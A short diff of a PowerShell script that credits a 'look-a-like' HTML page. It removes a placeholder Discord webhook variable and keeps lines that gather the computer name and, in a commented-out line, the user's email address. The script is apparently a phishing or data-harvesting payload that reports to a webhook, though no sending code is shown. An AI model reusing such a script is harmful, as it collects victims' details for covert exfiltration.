@@ -16,8 +16,6 @@ The HTML for this script has been modified but was originally from - https://git
 Kudos for creating this great look-a-like! 
 #>
 
-$dc = 'DISCORD_WEBHOOK_HERE'
-
 # GATHER SYSTEM AND USER INFO
 #$u = GPRESULT /R /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches
 $c = $env:COMPUTERNAME
